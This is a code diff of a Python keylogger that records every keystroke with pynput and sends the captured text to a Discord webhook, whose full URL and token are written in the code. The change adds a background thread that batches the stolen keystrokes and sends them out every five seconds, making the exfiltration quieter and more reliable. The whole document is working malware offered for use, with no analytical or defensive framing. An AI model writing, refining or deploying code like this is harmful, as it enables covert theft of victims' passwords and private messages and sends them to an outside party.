@@ -1,5 +1,7 @@
 from pynput import keyboard
 import requests
+import threading
+import time
 
 # Discord webhook URL (replace with your own webhook URL)
 WEBHOOK_URL = 'https://discord.com/api/webhooks/1348318193940303882/0SBww7zlNqUxQhzbkCOC6ScjU2rDoOVkUxxdIJzMNx4WeSSVkbkRXb7ux91eSnTDKWSi'
@@ -20,17 +22,26 @@ special_keys = {
     keyboard.Key.esc: "ESC",
 }
 
+# Lock for thread-safe access to keystrokes
+keystroke_lock = threading.Lock()
 
 def send_to_webhook(message):
     """Send the message to the Discord webhook."""
-    payload = {
-        "content": message
-    }
+    payload = {"content": message}
     try:
         requests.post(WEBHOOK_URL, json=payload)
     except Exception as e:
         print(f"Error sending message to webhook: {e}")
 
+def post_keystrokes():
+    """Send accumulated keystrokes at regular intervals."""
+    global keystrokes
+    while True:
+        time.sleep(5)  # Adjust this interval as needed (in seconds)
+        if keystrokes:
+            with keystroke_lock:
+                send_to_webhook(keystrokes)
+                keystrokes = ""  # Clear the keystrokes after sending
 
 def on_press(key):
     global keystrokes
@@ -42,18 +53,17 @@ def on_press(key):
         key_str = special_keys.get(key, str(key))  # Use the name from the dictionary if available
 
     # Append the key press to the keystrokes string
-    keystrokes += key_str
-
-    # Send keystrokes to Discord after every key press (you can batch this if needed)
-    send_to_webhook(keystrokes)
-    keystrokes = ""
-
+    with keystroke_lock:
+        keystrokes += key_str
 
 def on_release(key):
     if key == keyboard.Key.esc:
         # Stop the listener when the Esc key is pressed
         return False
 
+# Start the background thread for posting keystrokes
+keystrokes_thread = threading.Thread(target=post_keystrokes, daemon=True)
+keystrokes_thread.start()
 
 # Set up the listener
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
